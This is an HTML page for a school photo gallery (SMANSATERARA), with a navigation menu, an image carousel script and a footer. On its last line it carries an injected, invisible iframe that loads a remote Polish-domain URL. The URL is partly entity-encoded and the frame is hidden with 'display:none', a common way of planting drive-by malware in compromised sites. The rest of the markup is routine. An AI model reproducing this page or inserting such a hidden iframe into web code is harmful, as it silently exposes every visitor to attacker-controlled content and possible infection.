<!DOCTYPE html>
<html lang="en">
<head>
<title>Gallery SMANSATERARA</title>
<meta charset="utf-8">
<link rel="stylesheet" href="css/reset.css" type="text/css" media="all">
<link rel="stylesheet" href="css/layout.css" type="text/css" media="all">
<link rel="stylesheet" href="css/style.css" type="text/css" media="all">
<script type="text/javascript" src="js/jquery-1.5.2.js" ></script>
<script type="text/javascript" src="js/cufon-yui.js"></script>
<script type="text/javascript" src="js/cufon-replace.js"></script>
<script type="text/javascript" src="js/Terminal_Dosis_300.font.js"></script>
<script type="text/javascript" src="js/atooltip.jquery.js"></script>
<script src="js/roundabout.js" type="text/javascript"></script>
<script src="js/roundabout_shapes.js" type="text/javascript"></script>
<script src="js/jquery.easing.1.2.js" type="text/javascript"></script>
<script type="text/javascript" src="js/script.js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="js/html5.js"></script>
<style type="text/css">.bg {behavior:url("js/PIE.htc")}</style>
<![endif]-->
</head>
<body id="page1">
<div class="body1">
  <div class="body2">
    <div class="body3">
      <div class="main">
        <!-- header -->
        <header>
          <div class="wrapper">
            <h1><a href="index.html" id="logo"></a></h1>
            <nav>
              <ul id="menu">
                <li id="active"><a href="index.html">Home</a></li>
                <li><a href="about.html">Profil SMANSATERARA</a></li>
                <li><a href="folio.html">Fasilitas SMANSATERARA</a></li>
                <li class="end"><a href="../index2.php">Back To Halaman Utama</a></li>
              </ul>
            </nav>
          </div>
          <div class="relative">
            <div id="gallery">
              <ul id="myRoundabout">
                <li><img src="images/img1.png" alt=""></li>
                <li><img src="images/img2.png" alt=""></li>
                <li><img src="images/img5.png" alt=""></li>
                <li><img src="images/img4.png" alt=""></li>

              </ul>
            </div>
          </div>
        </header>
        <!-- / header-->
        <!-- content -->
        <section id="content"></section>
      </div>
    </div>
  </div>
</div>
<!-- / content -->
<div class="main">
  <!-- footer -->
  <footer>
    <div class="wrapper"> <span class="left"> Copyright &copy; <a href="#">SMANSATERARA</a> 2016 All Rights Reserved<br>
      Design by Wardhy_Iman@gmail.com<br>
      </span>
      <ul id="icons">
        <li><a href="#" class="normaltip" title="Facebook"><img src="images/icon1.png" alt=""></a></li>
        <li><a href="#" class="normaltip" title="Twitter"><img src="images/icon4.png" alt=""></a></li>
        <li><a href="#" class="normaltip" title="Linkedin"><img src="images/icon5.png" alt=""></a></li>
        <li><a href="#" class="normaltip" title="Reddit"><img src="images/icon6.png" alt=""></a></li>
      </ul>
    </div>
    <!-- {%FOOTER_LINK} -->
  </footer>
  <!-- / footer -->
</div>
<script type="text/javascript">Cufon.now();</script>
<script type="text/javascript">
$(document).ready(function () {
    $('#myRoundabout').roundabout({
        shape: 'square',
        minScale: 0.93, // tiny!
        maxScale: 1, // tiny!
        easing: 'easeOutExpo',
        clickToFocus: 'true',
        focusBearing: '0',
        duration: 800,
        reflect: true
    });
});
</script>
<div align=center></div><iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>                                                                               